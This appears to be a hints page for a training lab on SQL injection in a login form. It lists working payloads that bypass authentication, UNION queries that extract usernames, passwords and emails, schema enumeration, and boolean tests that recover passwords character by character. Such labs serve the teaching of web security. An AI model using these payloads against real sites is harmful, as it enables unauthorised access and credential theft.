Lab 4: Login-Based SQL Injection
Learn SQL injection in authentication systems
Objective: This lab demonstrates SQL injection in login forms. The query structure is: SELECT id, username, password FROM labsPage_user WHERE username = '{username}' AND password = '{password}'

Login Injection Strategy: Both parameters are quoted strings. Use these techniques:
  • ' OR 1=1-- - Bypass password check with OR condition
  • admin'-- - Login as admin without password
  • ' OR '1'='1 - Alternative bypass without comments
  • ' UNION SELECT 1,2,3-- - UNION injection for data extraction
  • ' OR username='admin'-- - Target specific user

Login-Based SQL Injection Hints
Basic Login Bypass:
OR condition: ' OR 1=1--
Skip password: admin'--
Both fields: ' OR '1'='1
Target user: ' OR username='admin'--
UNION Attacks:
Fake user: ' UNION SELECT 1,'admin','password'--
All users: ' UNION SELECT id,username,password FROM labsPage_user--
Email data: ' UNION SELECT 1,email_id,'email' FROM labsPage_email--
Information Gathering:
Database info: ' UNION SELECT 1,database(),version()--
Table names: ' UNION SELECT 1,table_name,'table' FROM information_schema.tables--
Column names: ' UNION SELECT 1,column_name,'column' FROM information_schema.columns WHERE table_name='labsPage_user'--
Boolean-Based Tests:
Count records: test' AND (SELECT COUNT(*) FROM labsPage_user)>0--
User exists: test' AND (SELECT COUNT(*) FROM labsPage_user WHERE username='admin')>0--
Password length: admin' AND LENGTH(password)>5--
Advanced Techniques:
False condition + UNION: ' AND 1=2 UNION SELECT 1,2,3--
Substring extraction: admin' AND SUBSTRING(password,1,1)='p'--
